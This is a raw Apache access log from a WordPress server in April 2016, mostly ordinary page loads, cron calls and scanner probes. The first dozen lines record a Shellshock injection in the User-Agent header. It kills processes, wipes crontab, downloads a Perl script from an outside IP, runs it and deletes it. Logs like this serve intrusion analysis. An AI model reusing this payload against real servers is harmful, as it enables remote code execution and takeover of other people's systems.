31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /phppath/cgi_wrapper HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /phppath/php HTTP/1.1" 404 465 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /phppath/php4 HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /phppath/php5 HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /phppath/php-cgi HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /phppath/php.cgi HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /php/php HTTP/1.1" 404 461 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:26 +0000] "GET /php/php4 HTTP/1.1" 404 462 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:26 +0000] "GET /php/php5 HTTP/1.1" 404 462 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:26 +0000] "GET /php/php-cgi HTTP/1.1" 404 465 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:26 +0000] "GET /php/php.cgi HTTP/1.1" 404 465 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:26 +0000] "GET /xampp/cgi.cgi HTTP/1.1" 404 467 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
::1 - - [29/Apr/2016:06:31:27 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:28 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:29 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:30 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:31 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:32 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:33 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:34 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:35 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:36 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:37 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:38 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:39 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:40 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:41 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:42 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:43 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:44 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:45 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:46 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:47 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:48 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:49 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:50 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:51 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:52 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:53 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
::1 - - [29/Apr/2016:06:31:54 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
89.163.252.7 - - [29/Apr/2016:09:05:59 +0000] "GET http://xssed.ir HTTP/1.1" 301 302 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
89.163.252.7 - - [29/Apr/2016:09:05:59 +0000] "GET http://xssed.irhttp/xssed.ir/ HTTP/1.1" 404 463 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
141.212.122.161 - - [29/Apr/2016:15:27:21 +0000] "GET / HTTP/1.1" 301 274 "-" "Go http package"
141.212.122.161 - - [29/Apr/2016:15:27:21 +0000] "GET / HTTP/1.1" 200 5833 "http://52.31.166.88:80" "Go http package"
52.31.166.88 - - [29/Apr/2016:15:27:21 +0000] "POST /wp-cron.php?doing_wp_cron=1461943641.5856881141662597656250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
185.49.14.190 - - [29/Apr/2016:16:15:53 +0000] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
92.222.246.137 - - [29/Apr/2016:17:22:27 +0000] "GET /xmlrpc.php HTTP/1.1" 200 268 "-" "-"
92.222.246.137 - - [29/Apr/2016:17:22:27 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
222.85.138.75 - coolmoon1202 [29/Apr/2016:19:05:45 +0000] "HEAD http://www.sina.com.cn HTTP/1.1" 301 278 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
222.85.138.75 - - [29/Apr/2016:19:05:46 +0000] "HEAD http://www.sina.com.cnhttp/www.sina.com.cn/ HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
185.49.14.190 - - [30/Apr/2016:06:06:28 +0000] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
64.16.209.177 - - [30/Apr/2016:08:06:29 +0000] "GET /skin/error.php HTTP/1.0" 404 498 "-" "-"
71.6.158.166 - - [30/Apr/2016:09:17:30 +0000] "GET / HTTP/1.1" 200 15606 "-" "-"
71.6.158.166 - - [30/Apr/2016:09:17:31 +0000] "GET /robots.txt HTTP/1.1" 404 445 "-" "-"
71.6.158.166 - - [30/Apr/2016:09:17:31 +0000] "GET /sitemap.xml HTTP/1.1" 404 446 "-" "-"
52.31.166.88 - - [30/Apr/2016:09:17:30 +0000] "POST /wp-cron.php?doing_wp_cron=1462007850.6966509819030761718750 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
185.49.14.190 - - [30/Apr/2016:14:14:38 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
182.118.54.60 - - [30/Apr/2016:16:47:49 +0000] "GET / HTTP/1.1" 200 5833 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
52.31.166.88 - - [30/Apr/2016:16:47:49 +0000] "POST /wp-cron.php?doing_wp_cron=1462034869.6461730003356933593750 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
92.222.246.137 - - [01/May/2016:06:27:40 +0000] "GET /xmlrpc.php HTTP/1.1" 200 268 "-" "-"
92.222.246.137 - - [01/May/2016:06:27:40 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
52.31.166.88 - - [01/May/2016:06:27:40 +0000] "POST /wp-cron.php?doing_wp_cron=1462084060.5717680454254150390625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
::1 - - [01/May/2016:06:37:29 +0000] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.14 (internal dummy connection)"
141.212.122.81 - - [17/Apr/2016:20:00:06 +0000] "GET /x HTTP/1.1" 400 0 "-" "Telesphoreo"
108.9.139.156 - - [18/Apr/2016:03:07:12 +0000] "GET http://httpheader.net/ HTTP/1.1" 301 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
108.9.139.156 - - [18/Apr/2016:03:07:13 +0000] "GET http://httpheader.nethttp/httpheader.net/ HTTP/1.1" 404 456 "http://httpheader.net/" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
52.31.166.88 - - [18/Apr/2016:03:07:13 +0000] "POST /wp-cron.php?doing_wp_cron=1460948833.1432669162750244140625 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
185.25.148.240 - - [18/Apr/2016:07:12:24 +0000] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 458 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
92.255.251.42 - - [18/Apr/2016:09:21:46 +0000] "GET / HTTP/1.1" 200 15625 "-" "-"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
199.19.249.196 - - [18/Apr/2016:12:58:03 +0000] "GET / HTTP/1.1" 200 15662 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET /wp-content/plugins/var/www/html/wp-content/themes/nuntius/nuntius.css?ver=2012-06-18 HTTP/1.1" 404 559 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET /wp-content/themes/nuntius/style.css?ver=4.0.10 HTTP/1.1" 200 10268 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 200 33583 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 200 3419 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET /wp-content/themes/nuntius/js/jquery.cycle.all.js?ver=20130415 HTTP/1.1" 200 13898 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:03 +0000] "GET /wp-content/themes/nuntius/js/functions.js?ver=201101207 HTTP/1.1" 200 934 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:04 +0000] "GET /wp-includes/images/smilies/icon_wink.gif HTTP/1.1" 200 452 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:04 +0000] "GET /wp-content/themes/nuntius/images/bg-container.png HTTP/1.1" 200 384 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:04 +0000] "GET /wp-content/themes/nuntius/images/primary-menu-current.png HTTP/1.1" 200 393 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:04 +0000] "GET /wp-content/themes/nuntius/images/breadcrumb-sep-ltr.png HTTP/1.1" 200 383 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:04 +0000] "GET /wp-content/themes/nuntius/images/bg-sidebar-search-form.png HTTP/1.1" 200 524 "http://52.31.166.88/wp-content/themes/nuntius/style.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:04 +0000] "GET /favicon.ico HTTP/1.1" 404 501 "http://52.31.166.88/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
52.31.166.88 - - [18/Apr/2016:12:58:03 +0000] "POST /wp-cron.php?doing_wp_cron=1460984283.5083689689636230468750 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
199.19.249.196 - - [18/Apr/2016:12:58:12 +0000] "GET /wordpress/wp-admin HTTP/1.1" 301 599 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:12 +0000] "GET /wordpress/wp-admin/ HTTP/1.1" 302 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
199.19.249.196 - - [18/Apr/2016:12:58:12 +0000] "GET /wordpress/wp-admin/ HTTP/1.1" 302 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
199.19.249.196 - - [18/Apr/2016:12:58:12 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2F52.31.166.88%2Fwordpress%2Fwp-admin%2F&reauth=1 HTTP/1.1" 200 5028 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:12 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2F52.31.166.88%2Fwordpress%2Fwp-admin%2F&reauth=1 HTTP/1.1" 200 3470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
199.19.249.196 - - [18/Apr/2016:12:58:13 +0000] "GET /wp-login.php?redirect_to=http://52.31.166.88/wordpress/wp-admin/&reauth=1 HTTP/1.1" 200 5028 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:13 +0000] "GET /wp-includes/css/buttons.min.css?ver=4.0.10 HTTP/1.1" 200 1621 "http://52.31.166.88/wp-login.php?redirect_to=http%3A%2F%2F52.31.166.88%2Fwordpress%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:13 +0000] "GET /wp-includes/css/dashicons.min.css?ver=4.0.10 HTTP/1.1" 200 25679 "http://52.31.166.88/wp-login.php?redirect_to=http%3A%2F%2F52.31.166.88%2Fwordpress%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:13 +0000] "GET /wp-admin/css/login.min.css?ver=4.0.10 HTTP/1.1" 200 5077 "http://52.31.166.88/wp-login.php?redirect_to=http%3A%2F%2F52.31.166.88%2Fwordpress%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
92.251.255.14 - - [18/Apr/2016:12:58:13 +0000] "GET /wp-admin/images/wordpress-logo.svg?ver=20131107 HTTP/1.1" 200 1809 "http://52.31.166.88/wp-admin/css/login.min.css?ver=4.0.10" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
199.19.249.196 - - [18/Apr/2016:12:58:13 +0000] "GET /wp-admin/images/wordpress-logo.svg?ver=20131107 HTTP/1.1" 200 1810 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
52.31.166.88 - - [18/Apr/2016:15:00:01 +0000] "POST /wp-cron.php?doing_wp_cron=1460991601.9712529182434082031250 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
74.91.18.44 - - [18/Apr/2016:15:00:01 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
74.91.23.108 - - [18/Apr/2016:16:37:30 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
69.30.226.222 - - [18/Apr/2016:17:18:51 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.93.185.252 - - [18/Apr/2016:19:14:18 +0000] "GET / HTTP/1.1" 200 15625 "-" "Research scan, mail networkresearch@yandex.ru"
208.100.26.229 - - [19/Apr/2016:03:01:55 +0000] "GET / HTTP/1.0" 200 15577 "-" "-"
52.31.166.88 - - [19/Apr/2016:03:01:55 +0000] "POST /wp-cron.php?doing_wp_cron=1461034915.8312320709228515625000 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
208.100.26.229 - - [19/Apr/2016:03:02:24 +0000] "HEAD / HTTP/1.1" 200 227 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)"
202.109.143.18 - - [19/Apr/2016:06:08:07 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/3.0 (compatible; Indy Library)"
101.77.199.9 - - [19/Apr/2016:07:56:52 +0000] "GET /script HTTP/1.1" 404 497 "-" "python-requests/2.7.0 CPython/2.7.0 Windows/2003Server"
73.23.29.223 - - [19/Apr/2016:08:18:30 +0000] "GET / HTTP/1.1" 200 15625 "-" "-"
91.196.50.33 - - [19/Apr/2016:11:16:01 +0000] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
80.82.78.38 - - [20/Apr/2016:06:24:15 +0000] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 459 "-" "Mozilla"
